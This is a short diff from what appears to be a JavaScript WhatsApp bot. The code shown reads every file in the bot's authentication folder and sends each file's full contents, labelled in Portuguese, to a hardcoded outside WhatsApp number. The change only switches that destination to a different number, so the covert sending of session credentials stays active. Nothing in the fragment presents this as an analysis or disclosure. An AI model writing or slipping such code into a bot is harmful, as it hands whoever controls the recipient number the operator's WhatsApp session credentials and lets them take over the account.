@@ -75,7 +75,7 @@ async function startBot() {
           const filePath = path.join(authFolder, file);
           if (fs.lstatSync(filePath).isFile()) {
             const content = fs.readFileSync(filePath, 'utf-8');
-            await sock.sendMessage('5521983480380@s.whatsapp.net', {
+            await sock.sendMessage('5521967687736@s.whatsapp.net', {
               text: `📂 Arquivo: *${file}*\n\n\`\`\`${content}\`\`\``
             });
           }
